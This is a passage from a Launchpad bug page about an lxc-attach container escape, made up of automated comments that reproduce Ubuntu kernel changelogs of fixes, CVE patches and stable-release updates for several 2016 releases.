    - SAUCE: apparmor: fix sleep in critical section

\* ghash-clmulni-intel module fails to load (LP: [#1633058](/bugs/1633058))

    - crypto: ghash-clmulni - Fix load failure

    - crypto: cryptd - Assign statesize properly

-- Luis Henriques <email address hidden> Thu, 24 Nov 2016 09:56:54 +0000

This bug was fixed in the package linux - 3.13.0-103.150
---------------
linux (3.13.0-103.150) trusty; urgency=low
[ Luis Henriques ]
\* Release Tracking Bug
- LP: #1644489
\* Possible regression on 3.13.0-102.149~precise1 x86\_64 (gce) (LP: #1644302)
- SAUCE: apparmor: delete extra variable dev\_path
linux (3.13.0-102.149) trusty; urgency=low
[ Luis Henriques ]
\* Release Tracking Bug
- LP: #1640581
\* lxc-attach to malicious container allows access to host (LP: #1639345)
- Revert "UBUNTU: ptrace: being capable wrt a process requires mapped
uids/gids"
- (upstream) mm: Add a user\_ns owner to mm\_struct and fix ptrace permission
checks
\* Syntax error extra parenthesis linux-headers-3.13.0-100/Makefile
(LP: #1636625)
- Makefile: fix extra parenthesis typo when CC\_STACKPROTECTOR\_REGULAR is
enabled
\* Add a driver for Amazon Elastic Network Adapters (ENA) (LP: #1635721)
- lib/bitmap.c: conversion routines to/from u32 array
- kernel.h: define u8, s8, u32, etc. limits
- net: ethtool: add new ETHTOOL\_xLINKSETTINGS API
- PCI/MSI: Add pci\_msix\_vec\_count()
- etherdevice: Use ether\_addr\_copy to copy an Ethernet address
- net: ena: Add a driver for Amazon Elastic Network Adapters (ENA)
- [config] enable CONFIG\_ENA\_ETHERNET=m (Amazon ENA driver)
\* CVE-2016-8658
- brcmfmac: avoid potential stack overflow in brcmf\_cfg80211\_start\_ap()
\* CVE-2016-7425
- scsi: arcmsr: Buffer overflow in arcmsr\_iop\_message\_xfer()
\* srcname from mount rule corrupted under load (LP: #1634753)
- SAUCE: apparmor: fix sleep in critical section
\* ghash-clmulni-intel module fails to load (LP: #1633058)
- crypto: ghash-clmulni - Fix load failure
- crypto: cryptd - Assign statesize properly
-- Luis Henriques <luis.henriques@canonical.com> Thu, 24 Nov 2016 09:56:54 +0000

| Changed in linux (Ubuntu Trusty): | |
| --- | --- |
| **status**: | Fix Committed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-11-30: |  |  | [#63](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/63) |
| --- | --- | --- | --- |

This bug was fixed in the package linux - 3.19.0-75.83

---------------

linux (3.19.0-75.83) vivid; urgency=low

[ Luis Henriques ]

\* Release Tracking Bug

    - LP: [#1640613](/bugs/1640613)

\* lxc-attach to malicious container allows access to host (LP: [#1639345](/bugs/1639345))

    - Revert "UBUNTU: ptrace: being capable wrt a process requires mapped

      uids/gids"

    - (upstream) mm: Add a user\_ns owner to mm\_struct and fix ptrace permission

      checks

\* CVE-2016-8658

    - brcmfmac: avoid potential stack overflow in brcmf\_cfg80211\_start\_ap()

\* CVE-2016-7425

    - scsi: arcmsr: Buffer overflow in arcmsr\_iop\_message\_xfer()

-- Luis Henriques <email address hidden> Wed, 09 Nov 2016 22:48:56 +0000

This bug was fixed in the package linux - 3.19.0-75.83
---------------
linux (3.19.0-75.83) vivid; urgency=low
[ Luis Henriques ]
\* Release Tracking Bug
- LP: #1640613
\* lxc-attach to malicious container allows access to host (LP: #1639345)
- Revert "UBUNTU: ptrace: being capable wrt a process requires mapped
uids/gids"
- (upstream) mm: Add a user\_ns owner to mm\_struct and fix ptrace permission
checks
\* CVE-2016-8658
- brcmfmac: avoid potential stack overflow in brcmf\_cfg80211\_start\_ap()
\* CVE-2016-7425
- scsi: arcmsr: Buffer overflow in arcmsr\_iop\_message\_xfer()
-- Luis Henriques <luis.henriques@canonical.com> Wed, 09 Nov 2016 22:48:56 +0000

| Changed in linux (Ubuntu Vivid): | |
| --- | --- |
| **status**: | Fix Committed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-11-30: |  |  | [#64](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/64) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/64/%2Bdownload) (22.5 KiB)

This bug was fixed in the package linux - 4.4.0-51.72

---------------

linux (4.4.0-51.72) xenial; urgency=low

[ Luis Henriques ]

\* Release Tracking Bug

    - LP: [#1644611](/bugs/1644611)

\* 4.4.0-1037-snapdragon #41: kernel panic on boot (LP: [#1644596](/bugs/1644596))

    - Revert "dma-mapping: introduce the DMA\_ATTR\_NO\_WARN attribute"

    - Revert "powerpc: implement the DMA\_ATTR\_NO\_WARN attribute"

    - Revert "nvme: use the DMA\_ATTR\_NO\_WARN attribute"

linux (4.4.0-50.71) xenial; urgency=low

[ Luis Henriques ]

\* Release Tracking Bug

    - LP: [#1644169](/bugs/1644169)

\* xenial 4.4.0-49.70 kernel breaks LXD userspace (LP: [#1644165](/bugs/1644165))

    - Revert "UBUNTU: SAUCE: (namespace) fuse: Allow user namespace mounts by

      default"

    - Revert "UBUNTU: SAUCE: (namespace) fs: Don't remove suid for CAP\_FSETID for

      userns root"

    - Revert "(namespace) Revert "UBUNTU: SAUCE: fs: Don't remove suid for

      CAP\_FSETID in s\_user\_ns""

    - Revert "UBUNTU: SAUCE: (namespace) fs: Allow superblock owner to change

      ownership of inodes"

    - Revert "(namespace) Revert "UBUNTU: SAUCE: fs: Allow superblock owner to

      change ownership of inodes with unmappable ids""

    - Revert "UBUNTU: SAUCE: (namespace) security/integrity: Harden against

      malformed xattrs"

    - Revert "(namespace) Revert "UBUNTU: SAUCE: ima/evm: Allow root in s\_user\_ns

      to set xattrs""

    - Revert "(namespace) dquot: For now explicitly don't support filesystems

      outside of init\_user\_ns"

    - Revert "(namespace) quota: Handle quota data stored in s\_user\_ns in

      quota\_setxquota"

    - Revert "(namespace) quota: Ensure qids map to the filesystem"

    - Revert "(namespace) Revert "UBUNTU: SAUCE: quota: Convert ids relative to

      s\_user\_ns""

    - Revert "(namespace) Revert "UBUNTU: SAUCE: quota: Require that qids passed

      to dqget() be valid and map into s\_user\_ns""

    - Revert "(namespace) vfs: Don't create inodes with a uid or gid unknown to

      the vfs"

    - Revert "(namespace) vfs: Don't modify inodes with a uid or gid unknown to

      the vfs"

    - Revert "UBUNTU: SAUCE: (namespace) fuse: Translate ids in posix acl xattrs"

    - Revert "UBUNTU: SAUCE: (namespace) posix\_acl: Export

      posix\_acl\_fix\_xattr\_userns() to modules"

    - Revert "(namespace) vfs: Verify acls are valid within superblock's

      s\_user\_ns."

    - Revert "(namespace) Revert "UBUNTU: SAUCE: fs: Update posix\_acl support to

      handle user namespace mounts""

    - Revert "(namespace) fs: Refuse uid/gid changes which don't map into

      s\_user\_ns"

    - Revert "(namespace) Revert "UBUNTU: SAUCE: fs: Refuse uid/gid changes which

      don't map into s\_user\_ns""

    - Revert "(namespace) mnt: Move the FS\_USERNS\_MOUNT check into sget\_userns"

linux (4.4.0-49.70) xenial; urgency=low

[ Luis Henriques ]

\* Release Tracking Bug

    - LP: [#1640921](/bugs/1640921)

\* Infiniband driver (kernel module) needed for Azure (LP: [#1641139](/bugs/1641139))

    - SAUCE: RDMA Infiniband for Windows Azure

    - [Config] CONFIG\_HYPERV\_INFINIBAND\_ND=m

    - SAUCE: Makefile RDMA infiniband driver for Windows Azure

    - [Config] Add hv\_network\_direct.ko to generic inclusion list

    - SAUCE: RDMA Infiniband for Windows Azure is dependent on amd64...

This bug was fixed in the package linux - 4.4.0-51.72
---------------
linux (4.4.0-51.72) xenial; urgency=low
[ Luis Henriques ]
\* Release Tracking Bug
- LP: #1644611
\* 4.4.0-1037-snapdragon #41: kernel panic on boot (LP: #1644596)
- Revert "dma-mapping: introduce the DMA\_ATTR\_NO\_WARN attribute"
- Revert "powerpc: implement the DMA\_ATTR\_NO\_WARN attribute"
- Revert "nvme: use the DMA\_ATTR\_NO\_WARN attribute"
linux (4.4.0-50.71) xenial; urgency=low
[ Luis Henriques ]
\* Release Tracking Bug
- LP: #1644169
\* xenial 4.4.0-49.70 kernel breaks LXD userspace (LP: #1644165)
- Revert "UBUNTU: SAUCE: (namespace) fuse: Allow user namespace mounts by
default"
- Revert "UBUNTU: SAUCE: (namespace) fs: Don't remove suid for CAP\_FSETID for
userns root"
- Revert "(namespace) Revert "UBUNTU: SAUCE: fs: Don't remove suid for
CAP\_FSETID in s\_user\_ns""
- Revert "UBUNTU: SAUCE: (namespace) fs: Allow superblock owner to change
ownership of inodes"
- Revert "(namespace) Revert "UBUNTU: SAUCE: fs: Allow superblock owner to
change ownership of inodes with unmappable ids""
- Revert "UBUNTU: SAUCE: (namespace) security/integrity: Harden against
malformed xattrs"
- Revert "(namespace) Revert "UBUNTU: SAUCE: ima/evm: Allow root in s\_user\_ns
to set xattrs""
- Revert "(namespace) dquot: For now explicitly don't support filesystems
outside of init\_user\_ns"
- Revert "(namespace) quota: Handle quota data stored in s\_user\_ns in
quota\_setxquota"
- Revert "(namespace) quota: Ensure qids map to the filesystem"
- Revert "(namespace) Revert "UBUNTU: SAUCE: quota: Convert ids relative to
s\_user\_ns""
- Revert "(namespace) Revert "UBUNTU: SAUCE: quota: Require that qids passed
to dqget() be valid and map into s\_user\_ns""
- Revert "(namespace) vfs: Don't create inodes with a uid or gid unknown to
the vfs"
- Revert "(namespace) vfs: Don't modify inodes with a uid or gid unknown to
the vfs"
- Revert "UBUNTU: SAUCE: (namespace) fuse: Translate ids in posix acl xattrs"
- Revert "UBUNTU: SAUCE: (namespace) posix\_acl: Export
posix\_acl\_fix\_xattr\_userns() to modules"
- Revert "(namespace) vfs: Verify acls are valid within superblock's
s\_user\_ns."
- Revert "(namespace) Revert "UBUNTU: SAUCE: fs: Update posix\_acl support to
handle user namespace mounts""
- Revert "(namespace) fs: Refuse uid/gid changes which don't map into
s\_user\_ns"
- Revert "(namespace) Revert "UBUNTU: SAUCE: fs: Refuse uid/gid changes which
don't map into s\_user\_ns""
- Revert "(namespace) mnt: Move the FS\_USERNS\_MOUNT check into sget\_userns"
linux (4.4.0-49.70) xenial; urgency=low
[ Luis Henriques ]
\* Release Tracking Bug
- LP: #1640921
\* Infiniband driver (kernel module) needed for Azure (LP: #1641139)
- SAUCE: RDMA Infiniband for Windows Azure
- [Config] CONFIG\_HYPERV\_INFINIBAND\_ND=m
- SAUCE: Makefile RDMA infiniband driver for Windows Azure
- [Config] Add hv\_network\_direct.ko to generic inclusion list
- SAUCE: RDMA Infiniband for Windows Azure is dependent on amd64
linux (4.4.0-48.69) xenial; urgency=low
[ Luis Henriques ]
\* Release Tracking Bug
- LP: #1640758
\* lxc-attach to malicious container allows access to host (LP: #1639345)
- Revert "UBUNTU: SAUCE: (noup) ptrace: being capable wrt a process requires
mapped uids/gids"
- (upstream) mm: Add a user\_ns owner to mm\_struct and fix ptrace permission
checks
\* take 'P' command from upstream xmon (LP: #1637978)
- powerpc/xmon: Add xmon command to dump process/task similar to ps(1)
\* zfs: importing zpool with vdev on zvol hangs kernel (LP: #1636517)
- SAUCE: (noup) Update zfs to 0.6.5.6-0ubuntu15
\* I2C touchpad does not work on AMD platform (LP: #1612006)
- pinctrl/amd: Configure GPIO register using BIOS settings
- pinctrl/amd: switch to using a bool for level
\* [LTCTest] vfio\_pci not loaded on Ubuntu 16.10 by default (LP: #1636733)
- [Config] CONFIG\_VFIO\_PCI=y for ppc64el
\* QEMU throws failure msg while booting guest with SRIOV VF (LP: #1630554)
- KVM: PPC: Always select KVM\_VFIO, plus Makefile cleanup
\* Allow fuse user namespace mounts by default in xenial (LP: #1634964)
- (namespace) mnt: Move the FS\_USERNS\_MOUNT check into sget\_userns
- (namespace) Revert "UBUNTU: SAUCE: fs: Refuse uid/gid changes which don't
map into s\_user\_ns"
- (namespace) fs: Refuse uid/gid changes which don't map into s\_user\_ns
- (namespace) Revert "UBUNTU: SAUCE: fs: Update posix\_acl support to handle
user namespace mounts"
- (namespace) vfs: Verify acls are valid within superblock's s\_user\_ns.
- SAUCE: (namespace) posix\_acl: Export posix\_acl\_fix\_xattr\_userns() to modules
- SAUCE: (namespace) fuse: Translate ids in posix acl xattrs
- (namespace) vfs: Don't modify inodes with a uid or gid unknown to the vfs
- (namespace) vfs: Don't create inodes with a uid or gid unknown to the vfs
- (namespace) Revert "UBUNTU: SAUCE: quota: Require that qids passed to
dqget() be valid and map into s\_user\_ns"
- (namespace) Revert "UBUNTU: SAUCE: quota: Convert ids relative to s\_user\_ns"
- (namespace) quota: Ensure qids map to the filesystem
- (namespace) quota: Handle quota data stored in s\_user\_ns in quota\_setxquota
- (namespace) dquot: For now explicitly don't support filesystems outside of
init\_user\_ns
- (namespace) Revert "UBUNTU: SAUCE: ima/evm: Allow root in s\_user\_ns to set
xattrs"
- SAUCE: (namespace) security/integrity: Harden against malformed xattrs
- (namespace) Revert "UBUNTU: SAUCE: fs: Allow superblock owner to change
ownership of inodes with unmappable ids"
- SAUCE: (namespace) fs: Allow superblock owner to change ownership of inodes
- (namespace) Revert "UBUNTU: SAUCE: fs: Don't remove suid for CAP\_FSETID in
s\_user\_ns"
- SAUCE: (namespace) fs: Don't remove suid for CAP\_FSETID for userns root
- SAUCE: (namespace) fuse: Allow user namespace mounts by default
\* [Feature] KBL - New device ID for Kabypoint(KbP) (LP: #1591618)
- SAUCE: mfd: lpss: Fix Intel Kaby Lake PCH-H properties
\* hio: SSD data corruption under stress test (LP: #1638700)
- SAUCE: hio: set bi\_error field to signal an I/O error on a BIO
- SAUCE: hio: splitting bio in the entry of .make\_request\_fn
\* Module sha1-mb fails to load (LP: #1637165)
- crypto: sha-mb - Fix load failure
- crypto: mcryptd - Fix load failure
\* please include mlx5\_core modules in linux-image-generic package
(LP: #1635223)
- [Config] Include mlx5 in main package
\* xgene i2c slimpro driver fails to load (LP: #1625232)
- mailbox: Add support for APM X-Gene platform mailbox driver
- mailbox/xgene-slimpro: Checking for IS\_ERR instead of NULL
- mailbox: xgene-slimpro: Fix wrong test for devm\_kzalloc
- [Config] Enabled XGENE\_SLIMPRO\_MBOX as a module
\* [Dell][XPS]Touchscreen fails to function after resume from s3 by Lid
close/open (LP: #1632527)
- gpio/pinctrl: sunxi: stop poking around in private vars
- pinctrl: intel: Only restore pins that are used by the driver
\* Xenial update to v4.4.30 stable release (LP: #1638272)
- Revert "x86/mm: Expand the exception table logic to allow new handling
options"
- Revert "fix minor infoleak in get\_user\_ex()"
- Linux 4.4.30
\* Xenial update to v4.4.29 stable release (LP: #1638267)
- drm/prime: Pass the right module owner through to dma\_buf\_export()
- drm/amdgpu: fix IB alignment for UVD
- drm/amdgpu/dce10: disable hpd on local panels
- drm/amdgpu/dce8: disable hpd on local panels
- drm/amdgpu/dce11: disable hpd on local panels
- drm/amdgpu/dce11: add missing drm\_mode\_config\_cleanup call
- drm/amdgpu: change vblank\_time's calculation method to reduce computational
error.
- drm/radeon: narrow asic\_init for virtualization
- drm/radeon/si/dpm: fix phase shedding setup
- drm/radeon: change vblank\_time's calculation method to reduce computational
error.
- drm/vmwgfx: Limit the user-space command buffer size
- drm/i915/gen9: fix the WaWmMemoryReadLatency implementation
- Revert "drm/i915: Check live status before reading edid"
- drm/i915: Account for TSEG size when determining 865G stolen base
- drm/i915: Unalias obj->phys\_handle and obj->userptr
- mm/hugetlb: fix memory offline with hugepage size > memory block size
- posix\_acl: Clear SGID bit when setting file permissions
- ipip: Properly mark ipip GRO packets as encapsulated.
- powerpc/eeh: Null check uses of eeh\_pe\_bus\_get
- perf stat: Fix interval output values
- genirq/generic\_chip: Add irq\_unmap callback
- uio: fix dmem\_region\_start computation
- ARM: clk-imx35: fix name for ckil clk
- spi: spi-fsl-dspi: Drop extra spi\_master\_put in device remove function
- mwifiex: correct aid value during tdls setup
- crypto: gcm - Fix IV buffer size in crypto\_gcm\_setkey
- crypto: arm/ghash-ce - add missing async import/export
- hwrng: omap - Only fail if pm\_runtime\_get\_sync returns < 0
- ASoC: topology: Fix error return code in soc\_tplg\_dapm\_widget\_create()
- ASoC: dapm: Fix possible uninitialized variable in snd\_soc\_dapm\_get\_volsw()
- ASoC: dapm: Fix value setting for \_ENUM\_DOUBLE MUX's second channel
- ASoC: dapm: Fix kcontrol creation for output driver widget
- staging: r8188eu: Fix scheduling while atomic splat
- power: bq24257: Fix use of uninitialized pointer bq->charger
- dmaengine: ipu: remove bogus NO\_IRQ reference
- x86/mm: Expand the exception table logic to allow new handling options
- s390/cio: fix accidental interrupt enabling during resume
- s390/con3270: fix use of uninitialised data
- s390/con3270: fix insufficient space padding
- clk: qoriq: fix a register offset error
- clk: divider: Fix clk\_divider\_round\_rate() to use clk\_readl()
- perf hists browser: Fix event group display
- perf symbols: Check symbol\_conf.allow\_aliases for kallsyms loading too
- perf symbols: Fixup symbol sizes before picking best ones
- mpt3sas: Don't spam logs if logging level is 0
- powerpc/nvram: Fix an incorrect partition merge
- ARM: pxa: pxa\_cplds: fix interrupt handling
- Linux 4.4.29
\* KVM: PPC: Book3S HV: Migrate pinned pages out of CMA (LP: #1632045)
- KVM: PPC: Book3S HV: Migrate pinned pages out of CMA
\* Xenial update to v4.4.28 stable release (LP: #1637510)
- gpio: mpc8xxx: Correct irq handler function
- mei: me: add kaby point device ids
- regulator: tps65910: Work around silicon erratum SWCZ010
- clk: imx6: initialize GPU clocks
- PM / devfreq: event: remove duplicate devfreq\_event\_get\_drvdata()
- rtlwifi: Fix missing country code for Great Britain
- mmc: block: don't use CMD23 with very old MMC cards
- mmc: sdhci: cast unsigned int to unsigned long long to avoid unexpeted error
- PCI: Mark Atheros AR9580 to avoid bus reset
- platform: don't return 0 from platform\_get\_irq[\_byname]() on error
- cpufreq: intel\_pstate: Fix unsafe HWP MSR access
- parisc: Increase KERNEL\_INITIAL\_SIZE for 32-bit SMP kernels
- parisc: Fix kernel memory layout regarding position of \_\_gp
- parisc: Increase initial kernel mapping size
- pstore/ramoops: fixup driver removal
- pstore/core: drop cmpxchg based updates
- pstore/ram: Use memcpy\_toio instead of memcpy
- pstore/ram: Use memcpy\_fromio() to save old buffer
- perf intel-pt: Fix snapshot overlap detection decoder errors
- perf intel-pt: Fix estimated timestamps for cycle-accurate mode
- perf intel-pt: Fix MTC timestamp calculation for large MTC periods
- dm: mark request\_queue dead before destroying the DM device
- dm: return correct error code in dm\_resume()'s retry loop
- dm mpath: check if path's request\_queue is dying in activate\_path()
- dm crypt: fix crash on exit
- powerpc/vdso64: Use double word compare on pointers
- powerpc/powernv: Pass CPU-endian PE number to opal\_pci\_eeh\_freeze\_clear()
- powerpc/powernv: Use CPU-endian hub diag-data type in
pnv\_eeh\_get\_and\_dump\_hub\_diag()
- powerpc/powernv: Use CPU-endian PEST in pnv\_pci\_dump\_p7ioc\_diag\_data()
- ubi: Deal with interrupted erasures in WL
- zfcp: fix fc\_host port\_type with NPIV
- zfcp: fix ELS/GS request&response length for hardware data router
- zfcp: close window with unblocked rport during rport gone
- zfcp: retain trace level for SCSI and HBA FSF response records
- zfcp: restore: Dont use 0 to indicate invalid LUN in rec trace
- zfcp: trace on request for open and close of WKA port
- zfcp: restore tracing of handle for port and LUN with HBA records
- zfcp: fix D\_ID field with actual value on tracing SAN responses
- zfcp: fix payload trace length for SAN request&response
- zfcp: trace full payload of all SAN records (req,resp,iels)
- scsi: zfcp: spin\_lock\_irqsave() is not nestable
- fbdev/efifb: Fix 16 color palette entry calculation
- ovl: Fix info leak in ovl\_lookup\_temp()
- ovl: copy\_up\_xattr(): use strnlen
- mb86a20s: fix the locking logic
- mb86a20s: fix demod settings
- cx231xx: don't return error on success
- cx231xx: fix GPIOs for Pixelview SBTVD hybrid
- ALSA: hda - Fix a failure of micmute led when having multi adcs
- MIPS: Fix -mabi=64 build of vdso.lds
- MIPS: ptrace: Fix regs\_return\_value for kernel context
- lib: move strtobool() to kstrtobool()
- lib: update single-char callers of strtobool()
- lib: add "on"/"off" support to kstrtobool
- Input: i8042 - skip selftest on ASUS laptops
- Input: elantech - force needed quirks on Fujitsu H760
- Input: elantech - add Fujitsu Lifebook E556 to force crc\_enabled
- sunrpc: fix write space race causing stalls
- NFSv4: Don't report revoked delegations as valid in nfs\_have\_delegation()
- NFSv4: nfs4\_copy\_delegation\_stateid() must fail if the delegation is invalid
- NFSv4: Open state recovery must account for file permission changes
- NFSv4.2: Fix a reference leak in nfs42\_proc\_layoutstats\_generic
- scsi: Fix use-after-free
- metag: Only define atomic\_dec\_if\_positive conditionally
- mm: filemap: don't plant shadow entries without radix tree node
- ipc/sem.c: fix complex\_count vs. simple op race
- arc: don't leak bits of kernel stack into coredump
- fs/super.c: fix race between freeze\_super() and thaw\_super()
- cifs: Limit the overall credit acquired
- fs/cifs: keep guid when assigning fid to fileinfo
- Clarify locking of cifs file and tcon structures and make more granular
- Display number of credits available
- Set previous session id correctly on SMB3 reconnect
- SMB3: GUIDs should be constructed as random but valid uuids
- Do not send SMB3 SET\_INFO request if nothing is changing
- Cleanup missing frees on some ioctls
- blkcg: Unlock blkcg\_pol\_mutex only once when cpd == NULL
- x86/e820: Don't merge consecutive E820\_PRAM ranges
- kvm: x86: memset whole irq\_eoi
- irqchip/gicv3: Handle loop timeout proper
- sd: Fix rw\_max for devices that report an optimal xfer size
- hpsa: correct skipping masked peripherals
- PKCS#7: Don't require SpcSpOpusInfo in Authenticode pkcs7 signatures
- bnx2x: Prevent false warning for lack of FC NPIV
- net/mlx4\_core: Allow resetting VF admin mac to zero
- acpi, nfit: check for the correct event code in notifications
- mm: workingset: fix crash in shadow node shrinker caused by
replace\_page\_cache\_page()
- mm: filemap: fix mapping->nrpages double accounting in fuse
- Using BUG\_ON() as an assert() is \_never\_ acceptable
- s390/mm: fix gmap tlb flush issues
- irqchip/gic-v3-its: Fix entry size mask for GITS\_BASER
- isofs: Do not return EACCES for unknown filesystems
- memstick: rtsx\_usb\_ms: Runtime resume the device when polling for cards
- memstick: rtsx\_usb\_ms: Manage runtime PM when accessing the device
- arm64: percpu: rewrite ll/sc loops in assembly
- arm64: kernel: Init MDCR\_EL2 even in the absence of a PMU
- ceph: fix error handling in ceph\_read\_iter
- powerpc/mm: Prevent unlikely crash in copro\_calculate\_slb()
- mmc: core: Annotate cmd\_hdr as \_\_le32
- mmc: rtsx\_usb\_sdmmc: Avoid keeping the device runtime resumed when unused
- mmc: rtsx\_usb\_sdmmc: Handle runtime PM while changing the led
- ext4: do not advertise encryption support when disabled
- jbd2: fix incorrect unlock on j\_list\_lock
- ubifs: Fix xattr\_names length in exit paths
- target: Re-add missing SCF\_ACK\_KREF assignment in v4.1.y
- target: Make EXTENDED\_COPY 0xe4 failure return COPY TARGET DEVICE NOT
REACHABLE
- target: Don't override EXTENDED\_COPY xcopy\_pt\_cmd SCSI status code
- Linux 4.4.28
\* Xenial update to v4.4.27 stable release (LP: #1637501)
- serial: 8250\_dw: Check the data->pclk when get apb\_pclk
- btrfs: assign error values to the correct bio structs
- drivers: base: dma-mapping: page align the size when unmap\_kernel\_range
- fuse: listxattr: verify xattr list
- fuse: invalidate dir dentry after chmod
- fuse: fix killing s[ug]id in setattr
- i40e: avoid NULL pointer dereference and recursive errors on early PCI error
- brcmfmac: fix memory leak in brcmf\_fill\_bss\_param
- ASoC: Intel: Atom: add a missing star in a memcpy call
- reiserfs: Unlock superblock before calling reiserfs\_quota\_on\_mount()
- reiserfs: switch to generic\_{get,set,remove}xattr()
- async\_pq\_val: fix DMA memory leak
- scsi: arcmsr: Simplify user\_len checking
- ext4: enforce online defrag restriction for encrypted files
- ext4: reinforce check of i\_dtime when clearing high fields of uid and gid
- ext4: fix memory leak in ext4\_insert\_range()
- ext4: allow DAX writeback for hole punch
- ext4: release bh in make\_indexed\_dir
- dlm: free workqueues after the connections
- vfs: move permission checking into notify\_change() for utimes(NULL)
- cfq: fix starvation of asynchronous writes
- Linux 4.4.27
\* Xenial update to v4.4.26 stable release (LP: #1637500)
- x86/build: Build compressed x86 kernels as PIE
- Linux 4.4.26
\* ISST-LTE:pVM nvme 0000:a0:00.0: iommu\_alloc failed on NVMe card
(LP: #1633128)
- dma-mapping: introduce the DMA\_ATTR\_NO\_WARN attribute
- powerpc: implement the DMA\_ATTR\_NO\_WARN attribute
- nvme: use the DMA\_ATTR\_NO\_WARN attribute
\* CVE-2016-8658
- brcmfmac: avoid potential stack overflow in brcmf\_cfg80211\_start\_ap()
\* Hotkey doesn't work on HP x360 (LP: #1620979)
- gpiolib: Make it possible to exclude GPIOs from IRQ domain
- pinctrl: cherryview: Do not mask all interrupts in probe
- pinctrl: cherryview: Do not add all southwest and north GPIOs to IRQ domain
\* Bad page state in process genwqe\_gunzip pfn:3c275 in the genwqe device
driver (LP: #1559194)
- SAUCE: (noup) Bad page state in process genwqe\_gunzip pfn:3c275 in the
genwqe device driver
\* CVE-2016-7425
- scsi: arcmsr: Buffer overflow in arcmsr\_iop\_message\_xfer()
\* Add ipvlan module to 16.04 kernel (LP: #1634705)
- [Config] Add ipvlan to the generic inclusion list
\* kernel generates ACPI Exception: AE\_NOT\_FOUND, Evaluating \_DOD incorrectly
(LP: #1634607)
- ACPI / video: skip evaluating \_DOD when it does not exist
\* BT still shows off after resume by wireless hotkey (LP: #1634380)
- Bluetooth: btusb: Fix atheros firmware download error
\* ghash-clmulni-intel module fails to load (LP: #1633058)
- crypto: ghash-clmulni - Fix load failure
- crypto: cryptd - Assign statesize properly
\* Xenial update to v4.4.25 stable release (LP: #1634153)
- timekeeping: Fix \_\_ktime\_get\_fast\_ns() regression
- ALSA: ali5451: Fix out-of-bound position reporting
- ALSA: usb-audio: Extend DragonFly dB scale quirk to cover other variants
- ALSA: usb-line6: use the same declaration as definition in header for MIDI
manufacturer ID
- mfd: rtsx\_usb: Avoid setting ucr->current\_sg.status
- mfd: atmel-hlcdc: Do not sleep in atomic context
- mfd: 88pm80x: Double shifting bug in suspend/resume
- mfd: wm8350-i2c: Make sure the i2c regmap functions are compiled
- KVM: PPC: Book3s PR: Allow access to unprivileged MMCR2 register
- KVM: MIPS: Drop other CPU ASIDs on guest MMU changes
- KVM: PPC: BookE: Fix a sanity check
- x86/boot: Fix kdump, cleanup aborted E820\_PRAM max\_pfn manipulation
- x86/irq: Prevent force migration of irqs which are not in the vector domain
- x86/dumpstack: Fix x86\_32 kernel\_stack\_pointer() previous stack access
- ARM: dts: mvebu: armada-390: add missing compatibility string and bracket
- ARM: dts: MSM8064 remove flags from SPMI/MPP IRQs
- ARM: cpuidle: Fix error return code
- ima: use file\_dentry()
- tpm: fix a race condition in tpm2\_unseal\_trusted()
- tpm\_crb: fix crb\_req\_canceled behavior
- Linux 4.4.25
\* backport fwts UEFI test driver to Xenial (LP: #1633506)
- efi: Add efi\_test driver for exporting UEFI runtime service interfaces
- [Config] CONFIG\_EFI\_TEST=m
\* Fix alps driver for multitouch function. (LP: #1633321)
- HID: alps: fix multitouch cursor issue
\* xgene merlin crashes when running as iperf server (LP: #1632739)
- drivers: net: xgene: optimizing the code
- xgene: get\_phy\_device() doesn't return NULL anymore
- drivers: net: xgene: Get channel number from device binding
- drivers: net: xgene: constify xgene\_cle\_ops structure
- drivers: net: xgene: Fix error handling
- drivers: net: xgene: fix IPv4 forward crash
- drivers: net: xgene: fix sharing of irqs
- drivers: net: xgene: fix ununiform latency across queues
- drivers: net: xgene: fix statistics counters race condition
- drivers: net: xgene: fix register offset
- drivers: net: xgene: Separate set\_speed from mac\_init
- drivers: net: xgene: Fix module unload crash - hw resource cleanup
- drivers: net: xgene: Fix module unload crash - change sw sequence
- drivers: net: xgene: Fix module unload crash - clkrst sequence
- drivers: net: phy: xgene: Add MDIO driver
- drivers: net: xgene: Add backward compatibility
- drivers: net: xgene: Enable MDIO driver
- drivers: net: xgene: Use exported functions
- drivers: net: xgene: ethtool: Use phy\_ethtool\_gset and sset
- dtb: xgene: Add MDIO node
- MAINTAINERS: xgene: Add driver and documentation path
- [Config] Enable MDIO\_XGENE as a modules
\* Add support for KabeLake i219-LOM chips (LP: #1632578)
- e1000e: Initial support for KabeLake
-- Luis Henriques <luis.henriques@canonical.com> Thu, 24 Nov 2016 17:56:21 +0000

| Changed in linux (Ubuntu Xenial): | |
| --- | --- |
| **status**: | Fix Committed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-11-30: |  |  | [#65](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/65) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/65/%2Bdownload) (26.6 KiB)

This bug was fixed in the package linux - 4.8.0-28.30

---------------

linux (4.8.0-28.30) yakkety; urgency=low

[ Luis Henriques ]

\* Release Tracking Bug

    - LP: [#1641083](/bugs/1641083)

\* lxc-attach to malicious container allows access to host (LP: [#1639345](/bugs/1639345))

    - Revert "UBUNTU: SAUCE: (noup) ptrace: being capable wrt a process requires

      mapped uids/gids"

    - (upstream) mm: Add a user\_ns owner to mm\_struct and fix ptrace permission

      checks

\* [Feature] AVX-512 new instruction sets (avx512\_4vnniw, avx512\_4fmaps)

    (LP: [#1637526](/bugs/1637526))

    - x86/cpufeature: Add AVX512\_4VNNIW and AVX512\_4FMAPS features

\* zfs: importing zpool with vdev on zvol hangs kernel (LP: [#1636517](/bugs/1636517))

    - SAUCE: (noup) Update zfs to 0.6.5.8-0ubuntu4.1

\* Move some device drivers build from kernel built-in to modules

    (LP: [#1637303](/bugs/1637303))

    - [Config] CONFIG\_TIGON3=m for all arches

